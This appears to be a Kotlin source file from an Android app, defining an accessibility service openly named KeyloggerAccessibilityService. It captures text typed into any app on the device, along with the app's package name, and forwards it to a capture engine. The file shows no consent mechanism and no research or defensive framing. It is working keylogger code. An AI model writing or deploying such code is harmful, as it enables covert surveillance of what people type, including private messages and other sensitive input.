package com.realityskin.data

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * KeyloggerAccessibilityService - System accessibility hook for text capture.
 *
 * Receives accessibility events from Android system and delegates to TextCaptureEngine.
 * Minimal logic - just routing to the singleton manager.
 */
class KeyloggerAccessibilityService : AccessibilityService() {
    private val TAG = "KeyloggerA11yService"

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Only capture text change events
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            return
        }

        // Extract text from event
        val text = extractText(event) ?: return
        val appPackage = event.packageName?.toString() ?: "unknown"

        // Delegate to TextCaptureEngine
        TextCaptureEngine.addCapturedText(text, appPackage)
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    /**
     * Extract text from accessibility event.
     */
    private fun extractText(event: AccessibilityEvent): String? {
        // Try to get text from event text list
        val eventText = event.text?.firstOrNull()?.toString()
        if (!eventText.isNullOrBlank()) {
            return eventText
        }

        // Try to get text from source node
        val sourceText = event.source?.text?.toString()
        if (!sourceText.isNullOrBlank()) {
            return sourceText
        }

        // No text found
        return null
    }
}
